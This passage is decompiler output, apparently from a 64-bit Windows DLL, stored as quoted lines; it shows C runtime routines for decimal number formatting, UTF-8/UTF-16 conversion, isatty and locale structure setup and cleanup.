    "      v81 = 0;",
    "      v182 = 0;",
    "LABEL_141:",
    "      if ( !v81 )",
    "        goto LABEL_142;",
    "LABEL_181:",
    "      v25 = v164 == v167;",
    "      v65 = v164 - v167;",
    "      v164 -= v167;",
    "      if ( v25 )",
    "      {",
    "        v64 = v168;",
    "        goto LABEL_183;",
    "      }",
    "    }",
    "    v35 = v182;",
    "    goto LABEL_140;",
    "  }",
    "  v106 = -v161;",
    "  v167 = -v161;",
    "  v107 = -v161 / 0xA;",
    "  LODWORD(v166) = v107;",
    "  v108 = v107;",
    "  v163 = v107;",
    "  if ( !v107 )",
    "    goto LABEL_257;",
    "  while ( 1 )",
    "  {",
    "    v109 = v108;",
    "    if ( v108 > 0x26 )",
    "      v109 = 38;",
    "    LODWORD(v168) = v109;",
    "    v110 = (unsigned int)(v109 - 1);",
    "    v111 = (unsigned __int8)byte_18003C8C2[4 * v110];",
    "    v112 = (unsigned __int8)byte_18003C8C3[4 * v110];",
    "    v113 = 4 * v111;",
    "    v184 = v112 + v111;",
    "    sub_1800368A0(&Source, 0, 4 * v111);",
    "    sub_180036160(",
    "      (char *)&Source + v113,",
    "      (char *)&unk_18003BFB0 + 4 * (unsigned __int16)word_18003C8C0[2 * v110],",
    "      4 * v112);",
    "    v114 = v184;",
    "    if ( v184 <= 1 )",
    "    {",
    "      if ( !Source )",
    "        goto LABEL_198;",
    "      if ( Source == 1 || !v28 )",
    "        goto LABEL_221;",
    "      LODWORD(v115) = 0;",
    "      v116 = Source;",
    "      v117 = 0;",
    "      do",
    "      {",
    "        v118 = (unsigned int)v115 + v116 * (unsigned int)Destination[v117];",
    "        Destination[v117] = v118;",
    "        v115 = HIDWORD(v118);",
    "        v117 = (unsigned int)(v117 + 1);",
    "      }",
    "      while ( (_DWORD)v117 != v28 );",
    "      goto LABEL_215;",
    "    }",
    "    if ( v28 > 1 )",
    "      break;",
    "    v119 = Destination[0];",
    "    v120 = 4LL * v184;",
    "    v28 = v184;",
    "    v180 = v184;",
    "    if ( v120 )",
    "    {",
    "      if ( v120 > 0x1CC )",
    "      {",
    "        sub_1800368A0(Destination, 0, 460);",
    "        *(_DWORD *)sub_18001A80C() = 34;",
    "        invalid_parameter_noinfo();",
    "      }",
    "      else",
    "      {",
    "        sub_180036160(Destination, &Source, v120);",
    "      }",
    "      v28 = v180;",
    "    }",
    "    if ( !(_DWORD)v119 )",
    "    {",
    "LABEL_198:",
    "      v28 = 0;",
    "      goto LABEL_218;",
    "    }",
    "    if ( (_DWORD)v119 == 1 || !v28 )",
    "      goto LABEL_221;",
    "    LODWORD(v115) = 0;",
    "    v121 = 0;",
    "    do",
    "    {",
    "      v122 = (unsigned int)v115 + v119 * (unsigned int)Destination[v121];",
    "      Destination[v121] = v122;",
    "      v115 = HIDWORD(v122);",
    "      v121 = (unsigned int)(v121 + 1);",
    "    }",
    "    while ( (_DWORD)v121 != v28 );",
    "LABEL_215:",
    "    if ( !(_DWORD)v115 )",
    "    {",
    "      v28 = v180;",
    "      goto LABEL_221;",
    "    }",
    "    if ( v180 < 0x73 )",
    "    {",
    "      Destination[v180] = v115;",
    "      v28 = v180 + 1;",
    "LABEL_218:",
    "      v180 = v28;",
    "LABEL_221:",
    "      v123 = 1;",
    "      goto LABEL_222;",
    "    }",
    "    v28 = 0;",
    "    v123 = 0;",
    "    v180 = 0;",
    "LABEL_222:",
    "    if ( !v123 )",
    "      goto LABEL_223;",
    "LABEL_255:",
    "    v25 = v163 == (_DWORD)v168;",
    "    v108 = v163 - v168;",
    "    v163 -= v168;",
    "    if ( v25 )",
    "    {",
    "      v106 = v167;",
    "      v107 = (unsigned int)v166;",
    "LABEL_257:",
    "      v138 = v106 - 10 * v107;",
    "      if ( !v138 )",
    "        goto LABEL_144;",
    "      v139 = dword_18003C958[v138 - 1];",
    "      if ( v139 )",
    "      {",
    "        if ( v139 == 1 || !v28 )",
    "          goto LABEL_144;",
    "        LODWORD(v140) = 0;",
    "        v141 = 0;",
    "        do",
    "        {",
    "          v142 = (unsigned int)v140 + v139 * (unsigned __int64)(unsigned int)Destination[v141];",
    "          Destination[v141] = v142;",
    "          v140 = HIDWORD(v142);",
    "          v141 = (unsigned int)(v141 + 1);",
    "        }",
    "        while ( (_DWORD)v141 != v28 );",
    "        if ( !HIDWORD(v142) )",
    "        {",
    "          v28 = v180;",
    "          goto LABEL_144;",
    "        }",
    "        if ( v180 < 0x73 )",
    "        {",
    "          Destination[v180] = HIDWORD(v142);",
    "          v28 = ++v180;",
    "          goto LABEL_144;",
    "        }",
    "      }",
    "      goto LABEL_223;",
    "    }",
    "  }",
    "  v124 = v28;",
    "  v125 = &Source;",
    "  if ( v184 < v28 )",
    "    v124 = v184;",
    "  else",
    "    v125 = Destination;",
    "  v178 = v125;",
    "  v165 = v124;",
    "  v126 = Destination;",
    "  if ( v184 >= v28 )",
    "    v126 = &Source;",
    "  v169 = v126;",
    "  if ( v184 < v28 )",
    "    v114 = v28;",
    "  v28 = 0;",
    "  v127 = 0;",
    "  v187 = 0;",
    "  while ( 1 )",
    "  {",
    "    v128 = v125[v127];",
    "    if ( (_DWORD)v128 )",
    "      break;",
    "    if ( (_DWORD)v127 == v28 )",
    "    {",
    "      v188[v127] = 0;",
    "      v28 = v127 + 1;",
    "      v187 = v127 + 1;",
    "    }",
    "LABEL_249:",
    "    v127 = (unsigned int)(v127 + 1);",
    "    if ( (_DWORD)v127 == v124 )",
    "    {",
    "      v137 = 4LL * v28;",
    "      v180 = v28;",
    "      if ( v137 )",
    "      {",
    "        if ( v137 > 0x1CC )",
    "        {",
    "          sub_1800368A0(Destination, 0, 460);",
    "          *(_DWORD *)sub_18001A80C() = 34;",
    "          invalid_parameter_noinfo();",
    "        }",
    "        else",
    "        {",
    "          sub_180036160(Destination, v188, v137);",
    "        }",
    "        v28 = v180;",
    "      }",
    "      goto LABEL_255;",
    "    }",
    "  }",
    "  LODWORD(v129) = 0;",
    "  v130 = v127;",
    "  if ( !v114 )",
    "  {",
    "LABEL_247:",
    "    if ( v130 == 115 )",
    "      goto LABEL_223;",
    "    v125 = v178;",
    "    v126 = v169;",
    "    goto LABEL_249;",
    "  }",
    "  while ( v130 != 115 )",
    "  {",
    "    v131 = v130;",
    "    if ( v130 == v28 )",
    "    {",
    "      v188[v130] = 0;",
    "      v187 = v130 + 1;",
    "    }",
    "    v132 = v130++;",
    "    v133 = (unsigned int)v129 + (unsigned int)v188[v131] + v128 * v126[(unsigned int)(v132 - v127)];",
    "    v188[v131] = v133;",
    "    v28 = v187;",
    "    v129 = HIDWORD(v133);",
    "    if ( v130 - (_DWORD)v127 == v114 )",
    "      break;",
    "    v126 = v169;",
    "  }",
    "  if ( !(_DWORD)v129 )",
    "  {",
    "LABEL_246:",
    "    v124 = v165;",
    "    goto LABEL_247;",
    "  }",
    "  while ( v130 != 115 )",
    "  {",
    "    v134 = v130 + 1;",
    "    v135 = v130;",
    "    v25 = v130++ == v28;",
    "    if ( v25 )",
    "    {",
    "      v188[v135] = 0;",
    "      v187 = v134;",
    "    }",
    "    v136 = (unsigned int)v129 + (unsigned __int64)(unsigned int)v188[v135];",
    "    v188[v135] = v136;",
    "    v28 = v187;",
    "    LODWORD(v129) = HIDWORD(v136);",
    "    if ( !HIDWORD(v136) )",
    "      goto LABEL_246;",
    "  }",
    "LABEL_223:",
    "  v82 = v177;",
    "  v180 = 0;",
    "  v83 = v177;",
    "LABEL_268:",
    "  v143 = sub_18001DBC0((char *)&v180, &v182);",
    "  v144 = (((int)v18 - 0x7FFFFFFF) & 0xFFFFFFFE) != 0 ? (int)v18 : 0;",
    "  if ( v143 == 10 )",
    "  {",
    "    v144 = v161 + 1;",
    "    *v82 = 49;",
    "    v83 = v82 + 1;",
    "    if ( v35 )",
    "    {",
    "      LODWORD(v145) = 0;",
    "      v146 = 0;",
    "      do",
    "      {",
    "        v147 = (unsigned int)v145 + 10LL * (unsigned int)v183[v146];",
    "        v183[v146] = v147;",
    "        v146 = (unsigned int)(v146 + 1);",
    "        v145 = HIDWORD(v147);",
    "      }",
    "      while ( (_DWORD)v146 != v35 );",
    "      if ( (_DWORD)v145 )",
    "      {",
    "        if ( v182 >= 0x73 )",
    "        {",
    "          v184 = 0;",
    "          v182 = 0;",
    "          memcpy_s(v183, 0x1CCu, &Source, 0);",
    "        }",
    "        else",
    "        {",
    "          v183[v182++] = v145;",
    "        }",
    "      }",
    "    }",
    "  }",
    "  else if ( v143 )",
    "  {",
    "    v83 = v82 + 1;",
    "    *v82 = v143 + 48;",
    "  }",
    "  else",
    "  {",
    "    v144 = v161 - 1;",
    "  }",
    "  *(_DWORD *)(v179 + 4) = v144;",
    "  v148 = v170;",
    "  if ( v144 >= 0 && v170 <= 0x7FFFFFFF && !v171 )",
    "    v148 = v144 + v170;",
    "  v149 = v148;",
    "  if ( a6 - 1 < (unsigned __int64)v148 )",
    "    v149 = a6 - 1;",
    "  v150 = &v82[v149];",
    "  v151 = 0;",
    "  if ( v83 == v150 )",
    "  {",
    "LABEL_302:",
    "    v152 = v180;",
    "  }",
    "  else",
    "  {",
    "    while ( 1 )",
    "    {",
    "      v152 = v180;",
    "      if ( !v180 )",
    "        break;",
    "      LODWORD(v153) = 0;",
    "      v154 = 0;",
    "      do",
    "      {",
    "        v155 = (unsigned int)v153 + 1000000000LL * (unsigned int)Destination[v154];",
    "        Destination[v154] = v155;",
    "        v153 = HIDWORD(v155);",
    "        v154 = (unsigned int)(v154 + 1);",
    "      }",
    "      while ( (_DWORD)v154 != v152 );",
    "      if ( HIDWORD(v155) )",
    "      {",
    "        if ( v180 >= 0x73 )",
    "        {",
    "          v184 = 0;",
    "          v180 = 0;",
    "          memcpy_s(Destination, 0x1CCu, &Source, 0);",
    "        }",
    "        else",
    "        {",
    "          Destination[v180++] = HIDWORD(v155);",
    "        }",
    "      }",
    "      v156 = sub_18001DBC0((char *)&v180, &v182);",
    "      for ( i = 8; i != -1; --i )",
    "      {",
    "        v158 = v156 % 0xA + 48;",
    "        v156 /= 0xAu;",
    "        if ( (int)v150 - (int)v83 > i )",
    "        {",
    "          v83[i] = v158;",
    "        }",
    "        else if ( v158 != 48 )",
    "        {",
    "          v151 = 1;",
    "        }",
    "      }",
    "      v159 = v150 - v83;",
    "      if ( v150 - v83 > 9 )",
    "        v159 = 9;",
    "      v83 += v159;",
    "      if ( v83 == v150 )",
    "        goto LABEL_302;",
    "    }",
    "  }",
    "  *v83 = 0;",
    "  if ( v152 || v151 )",
    "    v8 = 0;",
    "  sub_180034550(&v171, v172, v173);",
    "LABEL_307:",
    "  if ( v175 )",
    "    sub_1800345D4(&Env);",
    "  return v8;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002FE1C(_BYTE *a1, unsigned int a2, _QWORD *a3)",
    "{",
    "  __int64 v5; // rcx",
    "  char v6; // r9",
    "  __int64 v7; // r11",
    "  char v8; // al",
    "",
    "  if ( !a1 )",
    "    goto LABEL_2;",
    "  if ( a2 )",
    "  {",
    "    if ( (a2 & 0xFFFFFF80) == 0 )",
    "    {",
    "      *a1 = a2;",
    "      return 1;",
    "    }",
    "    if ( (a2 & 0xFFFFF800) == 0 )",
    "    {",
    "      v5 = 1;",
    "      v6 = -64;",
    "LABEL_16:",
    "      v7 = v5;",
    "      do",
    "      {",
    "        v8 = a2;",
    "        a2 >>= 6;",
    "        a1[v7--] = v8 & 0x3F | 0x80;",
    "      }",
    "      while ( v7 );",
    "      *a1 = v6 | a2;",
    "      JUMPOUT(0x180034CECLL);",
    "    }",
    "    if ( (a2 & 0xFFFF0000) != 0 )",
    "    {",
    "      if ( (a2 & 0xFFE00000) == 0 && a2 <= 0x10FFFF )",
    "      {",
    "        v5 = 3;",
    "        v6 = -16;",
    "        goto LABEL_16;",
    "      }",
    "    }",
    "    else if ( a2 - 55296 > 0x7FF )",
    "    {",
    "      v5 = 2;",
    "      v6 = -32;",
    "      goto LABEL_16;",
    "    }",
    "    JUMPOUT(0x180034CF4LL);",
    "  }",
    "  *a1 = 0;",
    "LABEL_2:",
    "  *a3 = 0;",
    "  return 1;",
    "}",
    "",
    "",
    "unsigned __int64 __fastcall sub_18002FEC0(__int16 *a1, int a2, int a3, int a4, __int64 a5)",
    "{",
    "  unsigned __int64 result; // rax",
    "  __int16 v7; // dx",
    "  unsigned int v8; // [rsp+30h] [rbp-18h] BYREF",
    "",
    "  result = sub_180034D08((unsigned int)&v8, a2, a3, a4, a5);",
    "  if ( result <= 4 )",
    "  {",
    "    v7 = v8;",
    "    if ( v8 > 0xFFFF )",
    "      v7 = -3;",
    "    if ( a1 )",
    "      *a1 = v7;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002FF04(_WORD *a1, _BYTE **a2, unsigned __int64 a3, int a4, __int64 a5)",
    "{",
    "  _BYTE *v5; // rdi",
    "  unsigned __int64 v7; // rbp",
    "  _WORD *v10; // rbx",
    "  __int64 v11; // r13",
    "  int v12; // r8d",
    "  __int64 v13; // rdx",
    "  __int16 v14; // cx",
    "  unsigned int v15; // ecx",
    "  __int64 i; // rbx",
    "  __int64 v18; // rbp",
    "  int v19; // r8d",
    "  __int64 v20; // rax",
    "  unsigned int v21; // [rsp+60h] [rbp+8h] BYREF",
    "",
    "  v5 = *a2;",
    "  v7 = a3;",
    "  if ( !a1 )",
    "  {",
    "    v18 = a5;",
    "    for ( i = 0; ; ++i )",
    "    {",
    "      if ( *v5 )",
    "        v19 = v5[1] ? (v5[2] != 0) + 3 : 2;",
    "      else",
    "        v19 = 1;",
    "      v20 = sub_180034D08(0, (_DWORD)v5, v19, a4, v18);",
    "      if ( v20 == -1 )",
    "        break;",
    "      if ( !v20 )",
    "        return i;",
    "      if ( v20 == 4 )",
    "        ++i;",
    "      v5 += v20;",
    "    }",
    "    *(_BYTE *)(v18 + 48) = 1;",
    "    *(_DWORD *)(v18 + 44) = 42;",
    "    return -1;",
    "  }",
    "  v10 = a1;",
    "  if ( a3 )",
    "  {",
    "    v11 = a5;",
    "    while ( 1 )",
    "    {",
    "      if ( *v5 )",
    "        v12 = v5[1] ? (v5[2] != 0) + 3 : 2;",
    "      else",
    "        v12 = 1;",
    "      v13 = sub_180034D08((unsigned int)&v21, (_DWORD)v5, v12, a4, v11);",
    "      if ( v13 == -1 )",
    "        break;",
    "      if ( !v13 )",
    "      {",
    "        v5 = 0;",
    "        *v10 = 0;",
    "        goto LABEL_15;",
    "      }",
    "      v14 = v21;",
    "      if ( v21 > 0xFFFF )",
    "      {",
    "        if ( v7 <= 1 )",
    "          goto LABEL_15;",
    "        v15 = v21 - 0x10000;",
    "        v21 = v15;",
    "        --v7;",
    "        *v10++ = (v15 >> 10) | 0xD800;",
    "        v14 = v15 & 0x3FF | 0xDC00;",
    "      }",
    "      *v10 = v14;",
    "      v5 += v13;",
    "      ++v10;",
    "      if ( !--v7 )",
    "        goto LABEL_15;",
    "    }",
    "    *a2 = v5;",
    "    *(_BYTE *)(v11 + 48) = 1;",
    "    *(_DWORD *)(v11 + 44) = 42;",
    "    return -1;",
    "  }",
    "LABEL_15:",
    "  *a2 = v5;",
    "  return v10 - a1;",
    "}",
    "",
    "",
    "int __cdecl isatty(int FileHandle)",
    "{",
    "  if ( FileHandle == -2 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 9;",
    "  }",
    "  else",
    "  {",
    "    if ( FileHandle >= 0 && FileHandle < (unsigned int)dword_18004DC70 )",
    "      return *(_BYTE *)(qword_18004D870[(unsigned __int64)FileHandle >> 6] + 72LL * (FileHandle & 0x3F) + 56) & 0x40;",
    "    *(_DWORD *)sub_18001A80C() = 9;",
    "    invalid_parameter_noinfo();",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "void __fastcall _free_lconv_mon(_QWORD *a1)",
    "{",
    "  XSAVE_FORMAT *v2; // rcx",
    "  XSAVE_FORMAT *v3; // rcx",
    "  XSAVE_FORMAT *v4; // rcx",
    "  XSAVE_FORMAT *v5; // rcx",
    "  XSAVE_FORMAT *v6; // rcx",
    "  XSAVE_FORMAT *v7; // rcx",
    "  XSAVE_FORMAT *v8; // rcx",
    "  XSAVE_FORMAT *v9; // rcx",
    "  XSAVE_FORMAT *v10; // rcx",
    "  XSAVE_FORMAT *v11; // rcx",
    "  XSAVE_FORMAT *v12; // rcx",
    "  XSAVE_FORMAT *v13; // rcx",
    "  XSAVE_FORMAT *v14; // rcx",
    "",
    "  if ( a1 )",
    "  {",
    "    v2 = (XSAVE_FORMAT *)a1[3];",
    "    if ( v2 != (XSAVE_FORMAT *)off_18004B228 )",
    "      sub_180023374(v2);",
    "    v3 = (XSAVE_FORMAT *)a1[4];",
    "    if ( v3 != (XSAVE_FORMAT *)off_18004B230 )",
    "      sub_180023374(v3);",
    "    v4 = (XSAVE_FORMAT *)a1[5];",
    "    if ( v4 != (XSAVE_FORMAT *)off_18004B238 )",
    "      sub_180023374(v4);",
    "    v5 = (XSAVE_FORMAT *)a1[6];",
    "    if ( v5 != (XSAVE_FORMAT *)off_18004B240 )",
    "      sub_180023374(v5);",
    "    v6 = (XSAVE_FORMAT *)a1[7];",
    "    if ( v6 != (XSAVE_FORMAT *)off_18004B248 )",
    "      sub_180023374(v6);",
    "    v7 = (XSAVE_FORMAT *)a1[8];",
    "    if ( v7 != (XSAVE_FORMAT *)off_18004B250 )",
    "      sub_180023374(v7);",
    "    v8 = (XSAVE_FORMAT *)a1[9];",
    "    if ( v8 != (XSAVE_FORMAT *)off_18004B258 )",
    "      sub_180023374(v8);",
    "    v9 = (XSAVE_FORMAT *)a1[13];",
    "    if ( v9 != (XSAVE_FORMAT *)off_18004B278 )",
    "      sub_180023374(v9);",
    "    v10 = (XSAVE_FORMAT *)a1[14];",
    "    if ( v10 != (XSAVE_FORMAT *)off_18004B280 )",
    "      sub_180023374(v10);",
    "    v11 = (XSAVE_FORMAT *)a1[15];",
    "    if ( v11 != (XSAVE_FORMAT *)off_18004B288 )",
    "      sub_180023374(v11);",
    "    v12 = (XSAVE_FORMAT *)a1[16];",
    "    if ( v12 != (XSAVE_FORMAT *)off_18004B290 )",
    "      sub_180023374(v12);",
    "    v13 = (XSAVE_FORMAT *)a1[17];",
    "    if ( v13 != (XSAVE_FORMAT *)off_18004B298 )",
    "      sub_180023374(v13);",
    "    v14 = (XSAVE_FORMAT *)a1[18];",
    "    if ( v14 != (XSAVE_FORMAT *)off_18004B2A0 )",
    "      sub_180023374(v14);",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180030214(unsigned __int64 a1)",
    "{",
    "  XSAVE_FORMAT *v1; // r15",
    "  XSAVE_FORMAT *v3; // r12",
    "  _UNKNOWN **v4; // rsi",
    "  XSAVE_FORMAT **v5; // rbx",
    "  __int64 result; // rax",
    "  XSAVE_FORMAT *v7; // rcx",
    "  __int64 v8; // rdi",
    "  int v9; // ebx",
    "  int v10; // ebx",
    "  int v11; // ebx",
    "  char **v12; // r13",
    "  int v13; // ebx",
    "  int v14; // ebx",
    "  int v15; // ebx",
    "  int v16; // ebx",
    "  int v17; // ebx",
    "  int v18; // ebx",
    "  int v19; // ebx",
    "  int v20; // ebx",
    "  int v21; // ebx",
    "  int v22; // ebx",
    "  int v23; // ebx",
    "  int v24; // ebx",
    "  int v25; // ebx",
    "  int v26; // ebx",
    "  int v27; // ebx",
    "  int v28; // ebx",
    "  int v29; // ebx",
    "  char *v30; // rdx",
    "  char v31; // al",
    "  char *v32; // r8",
    "  char v33; // cl",
    "  volatile signed __int32 *v34; // rax",
    "  volatile signed __int32 *v35; // rcx",
    "  __int128 v36; // [rsp+30h] [rbp-10h] BYREF",
    "",
    "  v1 = 0;",
    "  v36 = a1;",
    "  if ( *(_QWORD *)(a1 + 320) || *(_QWORD *)(a1 + 328) )",
    "  {",
    "    v4 = (_UNKNOWN **)sub_1800232FC(1u, 0x98u);",
    "    sub_180023374(0);",
    "    if ( !v4 )",
    "      return 1;",
    "    v3 = (XSAVE_FORMAT *)sub_1800232FC(1u, 4u);",
    "    sub_180023374(0);",
    "    if ( !v3 )",
    "    {",
    "      v7 = (XSAVE_FORMAT *)v4;",
    "LABEL_8:",
    "      sub_180023374(v7);",
    "      return 1;",
    "    }",
    "    if ( *(_QWORD *)(a1 + 320) )",
    "    {",
    "      v1 = (XSAVE_FORMAT *)sub_1800232FC(1u, 4u);",
    "      sub_180023374(0);",
    "      if ( !v1 )",
    "      {",
    "        sub_180023374((XSAVE_FORMAT *)v4);",
    "        v7 = v3;",
    "        goto LABEL_8;",
    "      }",
    "      v8 = *(_QWORD *)(a1 + 320);",
    "      v9 = sub_18002B354(&v36, 1, v8, 0x15u, (LPVOID *)v4 + 3);",
    "      v10 = sub_18002B354(&v36, 1, v8, 0x14u, (LPVOID *)v4 + 4) | v9;",
    "      v11 = sub_18002B354(&v36, 1, v8, 0x16u, (LPVOID *)v4 + 5) | v10;",
    "      v12 = (char **)(v4 + 7);",
    "      v13 = sub_18002B354(&v36, 1, v8, 0x17u, (LPVOID *)v4 + 6) | v11;",
    "      v14 = sub_18002B354(&v36, 1, v8, 0x18u, (LPVOID *)v4 + 7) | v13;",
    "      v15 = sub_18002B354(&v36, 1, v8, 0x50u, (LPVOID *)v4 + 8) | v14;",
    "      v16 = sub_18002B354(&v36, 1, v8, 0x51u, (LPVOID *)v4 + 9) | v15;",
    "      v17 = sub_18002B354(&v36, 0, v8, 0x1Au, (LPVOID *)v4 + 10) | v16;",
    "      v18 = sub_18002B354(&v36, 0, v8, 0x19u, (LPVOID *)((char *)v4 + 81)) | v17;",
    "      v19 = sub_18002B354(&v36, 0, v8, 0x54u, (LPVOID *)((char *)v4 + 82)) | v18;",
    "      v20 = sub_18002B354(&v36, 0, v8, 0x55u, (LPVOID *)((char *)v4 + 83)) | v19;",
    "      v21 = sub_18002B354(&v36, 0, v8, 0x56u, (LPVOID *)((char *)v4 + 84)) | v20;",
    "      v22 = sub_18002B354(&v36, 0, v8, 0x57u, (LPVOID *)((char *)v4 + 85)) | v21;",
    "      v23 = sub_18002B354(&v36, 0, v8, 0x52u, (LPVOID *)((char *)v4 + 86)) | v22;",
    "      v24 = sub_18002B354(&v36, 0, v8, 0x53u, (LPVOID *)((char *)v4 + 87)) | v23;",
    "      v25 = sub_18002B354(&v36, 2, v8, 0x15u, (LPVOID *)v4 + 13) | v24;",
    "      v26 = sub_18002B354(&v36, 2, v8, 0x14u, (LPVOID *)v4 + 14) | v25;",
    "      v27 = sub_18002B354(&v36, 2, v8, 0x16u, (LPVOID *)v4 + 15) | v26;",
    "      v28 = sub_18002B354(&v36, 2, v8, 0x17u, (LPVOID *)v4 + 16) | v27;",
    "      v29 = sub_18002B354(&v36, 2, v8, 0x50u, (LPVOID *)v4 + 17) | v28;",
    "      if ( v29 | (unsigned int)sub_18002B354(&v36, 2, v8, 0x51u, (LPVOID *)v4 + 18) )",
    "      {",
    "        _free_lconv_mon(v4);",
    "        sub_180023374((XSAVE_FORMAT *)v4);",
    "        sub_180023374(v3);",
    "        sub_180023374(v1);",
    "        return 1;",
    "      }",
    "      v30 = *v12;",
    "      v31 = **v12;",
    "      if ( v31 )",
    "      {",
    "        do",
    "        {",
    "          if ( (unsigned __int8)(v31 - 48) > 9u )",
    "          {",
    "            if ( v31 == 59 )",
    "            {",
    "              v32 = v30;",
    "              do",
    "              {",
    "                v33 = v32[1];",
    "                *v32++ = v33;",
    "              }",
    "              while ( v33 );",
    "              goto LABEL_18;",
    "            }",
    "          }",
    "          else",
    "          {",
    "            *v30 = v31 - 48;",
    "          }",
    "          ++v30;",
    "LABEL_18:",
    "          v31 = *v30;",
    "        }",
    "        while ( *v30 );",
    "      }",
    "    }",
    "    else",
    "    {",
    "      *(_OWORD *)v4 = *(_OWORD *)&off_18004B210;",
    "      *((_OWORD *)v4 + 1) = *(_OWORD *)&off_18004B220;",
    "      *((_OWORD *)v4 + 2) = *(_OWORD *)&off_18004B230;",
    "      *((_OWORD *)v4 + 3) = *(_OWORD *)&off_18004B240;",
    "      *((_OWORD *)v4 + 4) = *(_OWORD *)&off_18004B250;",
    "      *((_OWORD *)v4 + 5) = unk_18004B260;",
    "      *((_OWORD *)v4 + 6) = *(_OWORD *)&off_18004B270;",
    "      *((_OWORD *)v4 + 7) = *(_OWORD *)&off_18004B280;",
    "      *((_OWORD *)v4 + 8) = *(_OWORD *)&off_18004B290;",
    "      v4[18] = off_18004B2A0;",
    "    }",
    "    v5 = (XSAVE_FORMAT **)(a1 + 248);",
    "    *v4 = **(_UNKNOWN ***)(a1 + 248);",
    "    v4[1] = *(_UNKNOWN **)(*(_QWORD *)(a1 + 248) + 8LL);",
    "    v4[2] = *(_UNKNOWN **)(*(_QWORD *)(a1 + 248) + 16LL);",
    "    v4[11] = *(_UNKNOWN **)(*(_QWORD *)(a1 + 248) + 88LL);",
    "    v4[12] = *(_UNKNOWN **)(*(_QWORD *)(a1 + 248) + 96LL);",
    "    *(_DWORD *)&v3->ControlWord = 1;",
    "    if ( v1 )",
    "      *(_DWORD *)&v1->ControlWord = 1;",
    "    goto LABEL_27;",
    "  }",
    "  v3 = 0;",
    "  v4 = &off_18004B210;",
    "  v5 = (XSAVE_FORMAT **)(a1 + 248);",
    "LABEL_27:",
    "  v34 = *(volatile signed __int32 **)(a1 + 240);",
    "  if ( v34 )",
    "    _InterlockedDecrement(v34);",
    "  v35 = *(volatile signed __int32 **)(a1 + 224);",
    "  if ( v35 )",
    "  {",
    "    if ( _InterlockedExchangeAdd(v35, 0xFFFFFFFF) == 1 )",
    "    {",
    "      sub_180023374(*v5);",
    "      sub_180023374(*(XSAVE_FORMAT **)(a1 + 224));",
    "    }",
    "  }",
    "  *(_QWORD *)(a1 + 240) = v1;",
    "  result = 0;",
    "  *(_QWORD *)(a1 + 224) = v3;",
    "  *v5 = (XSAVE_FORMAT *)v4;",
    "  return result;",
    "}",
    "",
    "",
    "void __fastcall _free_lconv_num(XSAVE_FORMAT **a1)",
    "{",
    "  XSAVE_FORMAT *v2; // rcx",
    "  XSAVE_FORMAT *v3; // rcx",
    "  XSAVE_FORMAT *v4; // rcx",
    "  XSAVE_FORMAT *v5; // rcx",
    "  XSAVE_FORMAT *v6; // rcx",
    "",
    "  if ( a1 )",
    "  {",
    "    v2 = *a1;",
    "    if ( v2 != (XSAVE_FORMAT *)off_18004B210 )",
    "      sub_180023374(v2);",
    "    v3 = a1[1];",
    "    if ( v3 != (XSAVE_FORMAT *)off_18004B218 )",
    "      sub_180023374(v3);",
    "    v4 = a1[2];",
    "    if ( v4 != (XSAVE_FORMAT *)off_18004B220 )",
    "      sub_180023374(v4);",
    "    v5 = a1[11];",
    "    if ( v5 != (XSAVE_FORMAT *)off_18004B268 )",
    "      sub_180023374(v5);",
    "    v6 = a1[12];",
    "    if ( v6 != (XSAVE_FORMAT *)off_18004B270 )",
    "      sub_180023374(v6);",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18003079C(unsigned __int64 a1)",
    "{",
    "  XSAVE_FORMAT *v2; // r15",
    "  _UNKNOWN **v3; // rsi",
    "  XSAVE_FORMAT **v4; // r13",
    "  unsigned int v5; // r14d",
    "  __int64 result; // rax",
    "  __int64 v7; // rax",
    "  XSAVE_FORMAT *v8; // rcx",
    "  XSAVE_FORMAT *v9; // r12",
    "  __int64 v10; // rdi",
    "  int v11; // ebx",
    "  int v12; // ebx",
    "  int v13; // ebx",
    "  int v14; // ebx",
    "  _BYTE *v15; // rdx",
    "  char v16; // al",
    "  _BYTE *v17; // r8",
    "  char v18; // cl",
    "  volatile signed __int32 *v19; // rax",
    "  volatile signed __int32 *v20; // rcx",
    "  __int128 v21; // [rsp+30h] [rbp-38h] BYREF",
    "",
    "  v21 = a1;",
    "  if ( !*(_QWORD *)(a1 + 328) && !*(_QWORD *)(a1 + 320) )",
    "  {",
    "    v2 = 0;",
    "    v3 = &off_18004B210;",
    "    v4 = (XSAVE_FORMAT **)(a1 + 248);",
    "    goto LABEL_26;",
    "  }",
    "  v5 = 1;",
    "  v3 = (_UNKNOWN **)sub_1800232FC(1u, 0x98u);",
    "  if ( !v3 )",
    "    return v5;",
    "  v4 = (XSAVE_FORMAT **)(a1 + 248);",
    "  v7 = *(_QWORD *)(a1 + 248);",
    "  *(_OWORD *)v3 = *(_OWORD *)v7;",
    "  *((_OWORD *)v3 + 1) = *(_OWORD *)(v7 + 16);",
    "  *((_OWORD *)v3 + 2) = *(_OWORD *)(v7 + 32);",
    "  *((_OWORD *)v3 + 3) = *(_OWORD *)(v7 + 48);",
    "  *((_OWORD *)v3 + 4) = *(_OWORD *)(v7 + 64);",
    "  *((_OWORD *)v3 + 5) = *(_OWORD *)(v7 + 80);",
    "  *((_OWORD *)v3 + 6) = *(_OWORD *)(v7 + 96);",
    "  *((_OWORD *)v3 + 7) = *(_OWORD *)(v7 + 112);",
    "  *((_OWORD *)v3 + 8) = *(_OWORD *)(v7 + 128);",
    "  v3[18] = *(_UNKNOWN **)(v7 + 144);",
    "  v2 = (XSAVE_FORMAT *)sub_180024B50(4u);",
    "  sub_180023374(0);",
    "  if ( !v2 )",
    "  {",
    "    v8 = (XSAVE_FORMAT *)v3;",
    "LABEL_8:",
    "    sub_180023374(v8);",
    "    return v5;",
    "  }",
    "  *(_DWORD *)&v2->ControlWord = 0;",
    "  if ( *(_QWORD *)(a1 + 328) )",
    "  {",
    "    v9 = (XSAVE_FORMAT *)sub_180024B50(4u);",
    "    sub_180023374(0);",
    "    if ( !v9 )",
    "    {",
    "      sub_180023374((XSAVE_FORMAT *)v3);",
    "LABEL_14:",
    "      v8 = v2;",
    "      goto LABEL_8;",
    "    }",
    "    *(_DWORD *)&v9->ControlWord = 0;",
